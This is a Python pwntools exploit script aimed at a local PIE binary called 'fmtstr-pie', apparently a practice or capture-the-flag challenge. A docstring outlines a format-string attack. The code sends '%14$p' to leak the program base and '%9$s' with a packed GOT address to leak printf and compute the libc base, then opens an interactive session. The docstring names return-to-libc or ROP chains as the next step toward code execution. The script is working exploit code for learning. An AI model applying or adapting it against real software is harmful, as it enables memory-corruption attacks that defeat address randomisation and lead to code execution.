
#!/usr/bin/env python3
from pwn import *

context.binary = binary = ELF("./fmtstr-pie")

"""
Steps:
Leaking the PHDR Address:
    Use %14$p(%14$pAAA) to leak the Program Header (PHDR) address from the stack.
    Subtract the known PHDR offset(0x40) to determine the program's base address (PIE-enabled).

Locating printf in the GOT: (0x3fc0)
    Calculate the address of printf in the Global Offset Table (GOT) using the program base address and the fixed offset for printf in the GOT.
    - 0x40 + 0x3fc0 = + 0x3f80

Leaking the printf Address:
    Use %9$p(%9$pAAAA+addr) to leak the address stored in the GOT for printf.
    This address points to printf in libc.

Calculating the libc Base Address:
    Subtract the known offset of printf in libc from the leaked printf address to calculate libc's base address.

Exploitation:
    Use the calculated libc base address to locate functions like system and strings like /bin/sh.
    Craft payloads (e.g., ROP chains or return-to-libc attacks) to achieve arbitrary code execution or remote control.
"""

printf_address = binary.got.printf
print("\n\nThe address of the function printf "
      "in GOT.plt: ")
print(f"{hex(printf_address)}\n\n")

p = process()
p.recvuntil(b'Enter input:')
payload = b"%14$p   "
print(f"\nSending payload: {payload}")
p.sendline(payload)
response = p.recvuntil(b'Enter input:')

res = response.decode('latin-1')
lines = res.split("\n")
addr = 0
for line in lines:
    if line.startswith("0x"):
        line = line.strip()
        addr = int(line, 16)
        addr -= 0x40
        break
print(f"\nThe base address of the module fmtstr-pie : {hex(addr)}\n")

addr += printf_address
print(f"\nThe actual address of printf in GOT: {hex(addr)}\n")

payload = b"%9$sAAAA" + p64(addr)
print(f"\nSending payload: {payload}")
p.send(payload)
response = p.recvuntil(b'Enter input:')

res = response.decode('latin-1')
lines = res.split("\n")
for line in lines:
    if "%9$s" in line or line.startswith("Enter "):
        continue

    line = line.strip()

    hex_values = [char for char in line]
    hex_values = hex_values[0: 6]
    ascii_values = [ord(c) for c in hex_values]
    ascii_values.reverse()

    hex_value = 0
    for byte in ascii_values:
        hex_value = (hex_value << 8) | byte  # 左移8位并添加当前字节

    print(f"The actual address of the function printf: 0x{hex_value:08x}")

    libc_base = hex_value - 0x606f0
    if libc_base & 0xfff == 0:
        print(f"The base address of the libc: {hex(libc_base)}")
        break

p.interactive()
